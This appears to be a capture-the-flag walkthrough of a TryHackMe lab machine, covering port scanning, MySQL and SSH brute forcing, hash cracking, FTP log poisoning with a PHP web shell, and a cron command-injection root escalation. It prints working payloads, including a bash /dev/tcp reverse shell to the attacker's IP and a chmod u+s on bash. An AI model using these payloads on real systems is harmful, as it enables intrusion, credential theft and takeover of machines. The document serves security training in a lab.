@@ -1,0 +1,274 @@
+ip address: 10.10.103.73
+
+Nmap:
+
+PORT     STATE SERVICE REASON         VERSION
+21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c7:72:14:64:24:3c:11:01:e9:50:73:0f:a4:8c:33:d6 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXqzNUndANboqhGwqmfhneakMW3jjexZbHnw2pVw+ljoqMzxp2+CT06bhnRxtBRMeKXzX4E4cDOOKx1gHrkoVZgOjoz8X2GxfxH+KxGcmQPxODfgPpH18vxFvYaZpRAImr2jCa7TgfIyOZjtFb2rQDjAfvO+RK6egqMCqU+YuGdEeEvMBsNIiGymZl2pWzvk1Xenh7bMHl9YOiT41AhyFfvAQ4nfFLjk068S3OQKZ6d2jmFDr5YYd5Q9pLcoPGU9+yUCbBzrFCMdaRyvbYcbJnM8K65wKDhnrD5wAU6fAWyxRT6PaPFBhJp+fqMXZJAQUEWZHjAVOhHd+ZHgU6nXJ+u9GfXXj5ceZ7JJGclZzVKb7JHX93U1Ofuq+N+Zl3cdoc9Vi56N6ZamxaTTALZRM3UmrjqWfbDtyKZcnqQekb/40Pb4VzCzpvkGBW5++LXiMzQ/Ri7wcyfS0leBDMV0WdHR6DRiAVlii3M9YASX498tENGCBhe7yzGNFmPM3+rCM=
+|   256 0e:0e:07:a5:3c:32:09:ed:92:1b:68:84:f1:2f:cc:e1 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLe3OgttRgIkQikz1ER+UuSSBb80MH3A+1Vmd+VNBKZhl9EqUBT4K+YpIA7NJdau/V1NzhuZdvVAUWd03rb43wk=
+|   256 32:f1:d2:ec:ec:c1:ba:22:18:ec:02:f4:bc:74:c7:af (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGj5zUvI22cV4JdUIj3IFx/3PVHqujyIkwU9MjP3gpay
+80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Login
+3306/tcp open  mysql   syn-ack ttl 63 MySQL 8.0.28-0ubuntu0.20.04.3
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.28-0ubuntu0.20.04.3
+|   Thread ID: 10
+|   Capabilities flags: 65535
+|   Some Capabilities: FoundRows, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, LongColumnFlag, LongPassword, SupportsCompression, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, SupportsTransactions, DontAllowDatabaseTableColumn, ConnectWithDatabase, IgnoreSigpipes, Speaks41ProtocolOld, Support41Auth, InteractiveClient, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: \x06
+| /\x01Z>\x1ABD3(\x11Lz]3Tab\x18
+|_  Auth Plugin Name: caching_sha2_password
+| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
+| Issuer: commonName=MySQL_Server_8.0.26_Auto_Generated_CA_Certificate
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-10-19T04:00:09
+| Not valid after:  2031-10-17T04:00:09
+| MD5:   5441 cf59 375b 5402 352d 4df1 dab3 f945
+| SHA-1: de74 633f 3958 dd20 0a40 e5b4 ffa9 cae8 62d8 9d46
+| -----BEGIN CERTIFICATE-----
+| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
+| TF9TZXJ2ZXJfOC4wLjI2X0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
+| DTIxMTAxOTA0MDAwOVoXDTMxMTAxNzA0MDAwOVowQDE+MDwGA1UEAww1TXlTUUxf
+| U2VydmVyXzguMC4yNl9BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
+| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDceHCeokIvf/5tiDXOhmUK
+| HjWxbf+vHbhSEV0kg9J5CNyqL9JRLL+vLStv5KXyw4giERZmQZR7UM3VLu/jw1vg
+| K3CMB7CWqaCTJclhqHgJXlH2OU0LGlkgjvoUjV2pnQKGsCEDVl2Q4QiXKzSMai4d
+| ISz1QR9kQsV8bOEw7a46Ece9hPH4ESSUF7ZuTgnbLzBhxYlVa5HYQ2Zt7Z2c6ZGR
+| fyJTMtovZzmxN0KWaiOJzCBAT5/ZaTiVR2mK0KpzoxJ1sut5Trw98Uh2iBtC/rXt
+| z6+HiJjncW1phZNaXWgYrkp5GrGz39LPmK+XmBNlraokiLDubJkKrgvE8vILE9rd
+| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBAKcxAdpb
+| Z6ahf4CWhSPH4maAHWqYytghjPjG1Tlk6Lvwu3wTJUqItsmphvRIXvu1fME4TRZd
+| ZG9ZM8BARM5ZZYCRHmhfGA5JBaKpAvfjhPNVssvVjSVI4cpiMTVrPikva22Qzxq7
+| 33oVAFsfYlSiFqlRHqdNwAv5TSn0N85xU/En6DmUowaQzwTcPBrns1EC1lrDMBXU
+| WY2rYfQiC0EkZVhkQuNGkXyUj/e89mwp8RVVJFkmjZ6NbuGCDCenG+A6/kDWj9ps
+| mnDukjklQJKq9p6iIhrV69ejm3OHL5hfPRahBIM8AYAtljW2LQ67elYijyCde58Z
+| AcodcjpmQ8egD1w=
+|_-----END CERTIFICATE-----
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=8/1%OT=21%CT=1%CU=40189%PV=Y%DS=2%DC=T%G=Y%TM=62E792B8
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(
+OS:SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3
+OS:=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=F4B3%W2=F
+OS:4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW
+OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
+OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
+OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
+OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
+OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 36.447 days (since Sat Jun 25 18:01:28 2022)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT      ADDRESS
+1   73.63 ms 10.9.0.1
+2   74.06 ms 10.10.103.73
+
+
+Gobuster:
+gobuster dir  -u 10.10.103.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php 
+
+
+/index.php (Status: 200)
+/welcome.php (Status: 302)
+/logout.php (Status: 302)
+/config.php (Status: 200)
+
+
+Bruteforce on MySQL service: 
+hydra -l root -P rockyou.txt 10.10.103.73 mysql
+[3306][mysql] host: 10.10.103.73   login: root   password: rockyou
+
+Log in to Mysql server using bruteforced password:
+
+mysql -h 10.10.103.73 -u root -p'rockyou'
+
+see all databases: show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| website            |
++--------------------+
+5 rows in set (0.094 sec)
+
+select website database: use website;
+
+see all the tables from website database: show tables;
+-------------------+
+| Tables_in_website |
++-------------------+
+| users             |
++-------------------+
+1 row in set (0.079 sec)
+
+
+check the contents of users table: describe users;
+
++------------+--------------+------+-----+-------------------+-------------------+
+| Field      | Type         | Null | Key | Default           | Extra             |
++------------+--------------+------+-----+-------------------+-------------------+
+| id         | int          | NO   | PRI | NULL              | auto_increment    |
+| username   | varchar(50)  | NO   | UNI | NULL              |                   |
+| password   | varchar(255) | NO   |     | NULL              |                   |
+| created_at | datetime     | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED |
++------------+--------------+------+-----+-------------------+-------------------+
+4 rows in set (0.078 sec)
+
+
+display the username and password from users table:
+select username,password from users;
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| Adrian   | $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we |
++----------+--------------------------------------------------------------+
+
+Copy the hash of Adrian user to the local machine and use hashcat to crack it:
+
+hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
+
+get the password: hashcat -m 3200 hash.txt --show                                                                                 
+$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we:tigger
+
+Log in to the webpage with the credentials above and click on the log button
+
+We can tell that it is the vsftpd.log file because we can see our previous anonymous login attempt from earlier
+
+From this we can perform what's called a Log Poisoning Attack.
+
+Open burpsuite and refresh the page to intercept the traffic
+
+In a terminal try to log in to FTP
+
+$ ftp@10.10.103.73
+
+in the name field add the following: <?php echo system($_REQUEST['rse']); ?>
+
+go back to the Reapeter tool of burpsuite and add the rse parameter after the log one using the id command
+And we see that we are the user www-data. So now we can get a reverse shell
+
+Start a netcat listener: nc -lvnp 9001
+
+add the following paramater in the burp request in order to get a reverse shell:
+bash -c 'bash -i >& /dev/tcp/< Your IP >/9001 0>&1'
+DON'T FORGET TO URL ENCODE!!!!!
+URL encoded result: bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.9.0.166%2F9001%200%3E%261%27%20
+
+Forward the request and get a reverse shell
+
+Stabilize the shell: 
+
+python3 -c 'import pty;pty.spawn("/bin/bash")' then press Ctrl+Z
+stty raw -echo;fg then press ENTER twice
+export TERM=xterm
+
+going to adrian's home directory there is a hidden file .reminder
+
+ls -la
+total 48
+drwxr-xr-x 4 adrian adrian  4096 Apr  5 23:57 .
+drwxr-xr-x 3 root   root    4096 Oct 19  2021 ..
+lrwxrwxrwx 1 adrian adrian     9 Oct 20  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 adrian adrian   220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 adrian adrian  3771 Feb 25  2020 .bashrc
+drwx------ 2 adrian adrian  4096 Oct 19  2021 .cache
+drwxr-xr-x 3 nobody nogroup 4096 Oct 20  2021 ftp
+-rw-r--r-- 1 adrian adrian   807 Feb 25  2020 .profile
+-rw-r----- 1 adrian adrian   860 Aug  1 09:27 punch_in
+-rw-r----- 1 root   adrian    94 Apr  5 23:51 punch_in.sh
+-rw-r--r-- 1 adrian adrian    43 Oct 20  2021 .reminder
+-rw-rw-r-- 1 adrian adrian    75 Apr  5 23:53 .selected_editor
+-rw-r--r-- 1 adrian adrian     0 Oct 19  2021 .sudo_as_admin_successful
+-rw-r----- 1 adrian adrian    21 Apr  5 23:40 user.txt
+-rw------- 1 adrian adrian     0 Apr  6 00:01 .viminfo
+
+cat the contents of .reminder:
+Rules:
+best of 64
++ exclamation
+
+ettubrute
+
+
+It mentions 2 rules and the word ettubrute. The first rule is an actual hashcat rule used for password mutation. The second rule must be talking about another hashcat rule called append because of the + sign. With append, you can append any character and in this case it is the ! character. The ettubrute must be the password that we are mutating. You can learn more about this here
+
+create the append_exclamation_rule and add $! to it:
+
+subl append_eclamation_rule
+
+save the keyword ettubrute to a file: subl pass.txt
+
+Use the following command: hashcat --stdout pass.txt -r /usr/share/hashcat/rules/best64.rule -r append_exclamation.rule > passlist.txt
+
+with this generated passlist we can use hydra to bruteforce the ssh login
+
+hydra -l adrian -P passlist.txt 10.10.103.73 ssh
+
+[22][ssh] host: 10.10.103.73   login: adrian   password: theettubrute!
+
+
+log in to ssh: ssh adrian@10.10.103.73
+there are 2 files punch_in and punch_in.sh that runs every 2 minutes.
+
+in the ftp directory there is a hidden note:
+
+That silly admin
+He is such a micro manager, wants me to check in every minute by writing
+on my punch card.
+
+He even asked me to write the script for him.
+
+Little does he know, I am planning my revenge.
+
+The script used is vulnerable to command injection:
+
+cat script 
+#!/bin/sh
+while read line;
+do
+  /usr/bin/sh -c "echo $line";
+done < /home/adrian/punch_in
+
+
+How to exploit:
+
+in the punch_in file add the following line at the end:
+
+ $(chmod u+s /usr/bin/bash)
+
+ Wait for the sript to run ( 2 minutes)
+
+ check that the script was run cat punch_in
+
+ after this get root: $ /bin/bash -p
+
+ cat /root/root.txt: THM{C0mm@nD_Inj3cT1on_4_D@_BruT3}
+ cat /home/adrian/user.txt: THM{PoI$0n_tH@t_L0g}
+
+
+
+
